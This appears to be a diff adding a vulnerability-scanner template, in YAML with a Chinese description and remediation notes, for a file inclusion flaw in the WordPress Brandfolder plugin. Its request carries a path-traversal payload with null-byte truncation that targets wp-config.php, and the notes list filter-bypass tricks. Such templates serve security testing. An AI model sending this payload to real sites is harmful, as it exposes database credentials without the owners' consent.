@@ -1,0 +1,33 @@
+id: WordPress-Brandfolder-LFI
+info:
+  name: WordPress Brandfolder 3.0 Remote / Local File Inclusion
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Plugin Brandfolder 路径遍历问题导致文件包含漏洞
+    WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是一种应用插件。
+
+    WordPress Simple  brandfolder存在路径遍历漏洞，该漏洞允许远程攻击者通过wp_abspath参数实行文件包含攻击。
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.com/zh-cn/install-plugins/
+
+    临时修复方案：
+    1、PHP 中使用 open_basedir 配置限制访问在指定的区域，路径长短截断
+    2、过滤.（点）/（反斜杠）\\（反斜杠），编码绕过
+    3、禁止服务器远程文件包含
+    4、对于限制了包含文件后缀的情况，PHP版本小于5.3，php.ini magic_quotes_gpc = off，对可控参数未使用addslashes函数，满足这三个条件就可以使用%00截断。
+    5、问号、井号、空格绕过（远程）
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    words:
+    - wp-config.php
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00'
+  method: GET
